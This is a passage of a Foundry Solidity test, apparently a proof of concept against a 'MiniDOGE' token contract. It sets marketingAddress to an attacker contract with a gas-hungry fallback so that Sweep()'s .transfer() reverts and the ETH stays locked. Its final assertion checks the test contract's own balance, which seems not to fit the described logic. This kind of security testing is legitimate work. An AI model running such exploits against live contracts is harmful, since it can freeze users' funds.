        vm.startPrank(ownerAddr);

        // Step 2: Set marketingAddress to our attacker contract with expensive fallback
        MiniDOGE(TARGET).setMarketingAddress(attacker);

        // Step 3: Enable swap and liquify to ensure swapTokens can be triggered
        MiniDOGE(TARGET).setSwapAndLiquifyEnabled(true);

        vm.stopPrank();

        // Step 4: Inject ETH into the target contract
        deal(TARGET, 5 ether);

        // Record initial balance
        uint256 initialBalance = TARGET.balance;
        assertGt(initialBalance, 0, "Contract should have ETH");

        // Step 5: Try to call Sweep() - this uses .transfer() internally
        // We expect this to fail due to our expensive fallback
        vm.startPrank(ownerAddr);

        // This call will revert because attacker fallback requires >2300 gas
        // but .transfer() only provides 2300 gas
        try MiniDOGE(TARGET).Sweep() {
            // If it succeeds, the vulnerability wasn't triggered
            revert("Sweep succeeded unexpectedly");
        } catch (bytes memory) {
            // Expected: transfer failed due to gas limit
        }

        vm.stopPrank();

        // Step 6: Verify the contract still has ETH (transfer failed, ETH stayed)
        uint256 finalBalance = TARGET.balance;
        assertGt(finalBalance, 0, "Contract should still have ETH after failed transfer");
        assertEq(finalBalance, initialBalance, "ETH balance should be unchanged");
        assertGt(address(this).balance, 0, "Logic Exploit Failed");
    }

    receive() external payable {}
}

